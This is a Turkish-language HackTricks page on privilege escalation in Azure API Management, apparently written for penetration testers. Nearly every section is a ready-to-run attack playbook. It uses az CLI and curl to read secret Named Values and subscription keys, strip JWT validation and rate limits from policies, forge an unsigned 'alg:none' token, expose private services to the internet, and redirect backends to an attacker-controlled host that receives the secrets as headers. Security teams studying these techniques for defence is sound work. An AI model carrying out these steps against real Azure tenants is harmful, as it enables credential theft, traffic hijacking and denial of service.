# Az - API Management Privesc

{{#include ../../../banners/hacktricks-training.md}}

## `Microsoft.ApiManagement/service/namedValues/read` & `Microsoft.ApiManagement/service/namedValues/listValue/action`

Saldırı, Azure API Management Named Values içinde saklanan hassas secrets'e erişmeyi hedefler; bu, secret değerleri doğrudan almak veya managed identities aracılığıyla Key Vault–backed secrets elde etmek için izinleri suistimal etmek yoluyla yapılabilir.
```bash
az apim nv show-secret --resource-group <resource-group> --service-name <service-name> --named-value-id <named-value-id>
```
## `Microsoft.ApiManagement/service/subscriptions/read` & `Microsoft.ApiManagement/service/subscriptions/listSecrets/action`
Her abonelik için, saldırgan POST yöntemiyle listSecrets endpoint'ini kullanarak abonelik anahtarlarını elde edebilir:
```bash
az rest --method POST \
--uri "https://management.azure.com/subscriptions/<subscription-id>/resourceGroups/<resource-group>/providers/Microsoft.ApiManagement/service/<service-name>/subscriptions/<subscription-sid>/listSecrets?api-version=2024-05-01"
```
Yanıt, subscription primary key (primaryKey) ve secondary key (secondaryKey) içerir. Bu anahtarlarla attacker API Management Gateway üzerinden yayınlanmış API'lere kimlik doğrulaması yapabilir ve erişim sağlayabilir:
```bash
curl -H "Ocp-Apim-Subscription-Key: <primary-key-or-secondary-key>" \
https://<service-name>.azure-api.net/<api-path>
```
Saldırgan, aboneliğe bağlı tüm APIs ve products öğelerine erişebilir. Abonelik hassas products veya APIs'lere erişim sağlıyorsa, saldırgan gizli bilgilere ulaşabilir veya yetkisiz işlemler gerçekleştirebilir.

## `Microsoft.ApiManagement/service/policies/write` or `Microsoft.ApiManagement/service/apis/policies/write`

Saldırgan önce mevcut API politikasını alır:
```bash
az rest --method GET \
--uri "https://management.azure.com/subscriptions/<subscription-id>/resourceGroups/<resource-group>/providers/Microsoft.ApiManagement/service/<service-name>/apis/<api-id>/policies/?api-version=2024-05-01&format=rawxml"
```
Saldırgan, hedeflerine bağlı olarak politikayı çeşitli şekillerde değiştirebilir. Örneğin, kimlik doğrulamayı devre dışı bırakmak için, politika JWT token validation içeriyorsa saldırgan o bölümü kaldırabilir veya yorum satırı haline getirebilir:
```xml
<policies>
<inbound>
<base />
<!-- JWT validation removed by the attacker -->
<!-- <validate-jwt header-name="Authorization" failed-validation-httpcode="401" >
...
</validate-jwt> -->
</inbound>
<backend>
<base />
</backend>
<outbound>
<base />
</outbound>
<on-error>
<base />
</on-error>
</policies>
```
rate limiting kontrollerini kaldırmak ve denial-of-service saldırılarına izin vermek için, saldırgan quota ve rate-limit politikalarını kaldırabilir veya yorum satırı haline getirebilir:
```xml
<policies>
<inbound>
<base />
<!-- Rate limiting removed by the attacker -->
<!-- <rate-limit calls="100" renewal-period="60" />
<quota-by-key calls="1000" renewal-period="3600" counter-key="@(context.Subscription.Id)" /> -->
</inbound>
...
</policies>
```
Backend rotasını değiştirmek ve trafiği saldırganın kontrolündeki bir servera yönlendirmek için:
```xml
<policies>
...
<inbound>
<base />
<set-backend-service base-url="https://attacker-controlled-server.com" />
</inbound>
...
</policies>
```
Saldırgan daha sonra değiştirilmiş politikayı uygular. İstek gövdesi, politikayı XML formatında içeren bir JSON nesnesi olmalıdır:
```bash
az rest --method PUT \
--uri "https://management.azure.com/subscriptions/<subscription-id>/resourceGroups/<resource-group>/providers/Microsoft.ApiManagement/service/<service-name>/apis/<api-id>/policies/policy?api-version=2024-05-01" \
--headers "Content-Type=application/json" \
--body '{
"properties": {
"format": "rawxml",
"value": "<policies><inbound><base /></inbound><backend><base /></backend><outbound><base /></outbound><on-error><base /></on-error></policies>"
}
}'
```
## JWT Doğrulama Yanlış Yapılandırması

Saldırganın, bir API'nin JWT token doğrulaması kullandığını ve politikanın yanlış yapılandırıldığını bilmesi gerekir. Kötü yapılandırılmış JWT token doğrulama politikaları `require-signed-tokens="false"` veya `require-expiration-time="false"` içerebilir; bu, servisin imzasız tokenları veya süresi hiç dolmayan tokenları kabul etmesine izin verir.

Saldırgan, none algorithm (unsigned) kullanarak kötü amaçlı bir JWT token oluşturur:
```
# Header: {"alg":"none"}
# Payload: {"sub":"user"}
eyJhbGciOiJub25lIn0.eyJzdWIiOiJ1c2VyIn0.
```
Saldırgan, kötü amaçlı token'ı kullanarak API'ye bir istek gönderir:
```bash
curl -X GET \
-H "Authorization: Bearer eyJhbGciOiJub25lIn0.eyJzdWIiOiJ1c2VyIn0." \
https://<apim>.azure-api.net/path
```
Eğer politika `require-signed-tokens="false"` olarak yanlış yapılandırıldıysa, servis imzasız token'ı kabul eder. Saldırgan ayrıca `require-expiration-time="false"` ise expiration claim'i olmayan bir token oluşturabilir.

## `Microsoft.ApiManagement/service/applynetworkconfigurationupdates/action`
Saldırgan önce servisin mevcut ağ yapılandırmasını kontrol eder:
```bash
az rest --method GET \
--uri "https://management.azure.com/subscriptions/<subscription-id>/resourceGroups/<resource-group>/providers/Microsoft.ApiManagement/service/<apim>?api-version=2024-05-01"
```
Saldırgan, JSON yanıtını `publicNetworkAccess` ve `virtualNetworkType` değerlerini doğrulamak için inceler. Eğer `publicNetworkAccess` false olarak ayarlanmışsa veya `virtualNetworkType` Internal olarak ayarlanmışsa, servis özel erişim için yapılandırılmıştır.

Servisi İnternet'e açmak için saldırgan her iki ayarı da değiştirmelidir. Servis internal modda çalışıyorsa (`virtualNetworkType: "Internal"`), saldırgan bunu None veya External olarak değiştirir ve `publicNetworkAccess`'ı etkinleştirir. Bu, Azure Management API kullanılarak yapılabilir:
```bash
az rest --method PATCH \
--uri "https://management.azure.com/subscriptions/<subscription-id>/resourceGroups/<resource-group>/providers/Microsoft.ApiManagement/service/<apim>?api-version=2024-05-01" \
--headers "Content-Type=application/json" \
--body '{
"properties": {
"publicNetworkAccess": "Enabled",
"virtualNetworkType": "None"
}
}'
```
`virtualNetworkType` None veya External olarak ayarlandığında ve `publicNetworkAccess` etkinleştirildiğinde, hizmet ve tüm API'leri Internet'ten erişilebilir hale gelir; daha önce özel bir ağ veya private endpoints arkasında korunuyor olsalar bile.

## `Microsoft.ApiManagement/service/backends/write`
Saldırgan, hangi backends'i değiştireceğini belirlemek için mevcut backends'i önce listeler:
```bash
az rest --method GET \
--uri "https://management.azure.com/subscriptions/<subscription-id>/resourceGroups/<resource-group>/providers/Microsoft.ApiManagement/service/<service-name>/backends?api-version=2024-05-01"
```
Saldırgan, değiştirmek istediği backend'in mevcut yapılandırmasını alır:
```bash
az rest --method GET \
--uri "https://management.azure.com/subscriptions/<subscription-id>/resourceGroups/<resource-group>/providers/Microsoft.ApiManagement/service/<service-name>/backends/<backend-id>?api-version=2024-05-01"
```
Saldırgan, backend URL'sini kendi kontrolündeki bir sunucuya yönlendirir. Önce önceki yanıttan ETag'i alır, sonra backend'i günceller:
```bash
az rest --method PUT \
--uri "https://management.azure.com/subscriptions/<subscription-id>/resourceGroups/<resource-group>/providers/Microsoft.ApiManagement/service/<service-name>/backends/<backend-id>?api-version=2024-05-01" \
--headers "Content-Type=application/json" "If-Match=*" \
--body '{
"properties": {
"url": "https://attacker-controlled-server.com",
"protocol": "http",
"description": "Backend modified by attacker"
}
}'
```
Alternatif olarak, saldırgan gizli bilgiler içeren Named Values'i dışarı çıkarmak için backend başlıklarını yapılandırabilir. Bu, backend kimlik bilgileri yapılandırması aracılığıyla yapılır:
```bash
az rest --method PUT \
--uri "https://management.azure.com/subscriptions/<subscription-id>/resourceGroups/<resource-group>/providers/Microsoft.ApiManagement/service/<service-name>/backends/<backend-id>?api-version=2024-05-01" \
--headers "Content-Type=application/json" "If-Match=*" \
--body '{
"properties": {
"url": "https://attacker-controlled-server.com",
"protocol": "http",
"credentials": {
"header": {
"X-Secret-Value": ["{{named-value-secret}}"]
}
}
}
}'
```
Bu yapılandırma ile Named Values, tüm isteklere headers olarak saldırgan kontrolündeki backend'e gönderilir ve hassas sırların sızdırılmasına olanak tanır.

{{#include ../../../banners/hacktricks-training.md}}
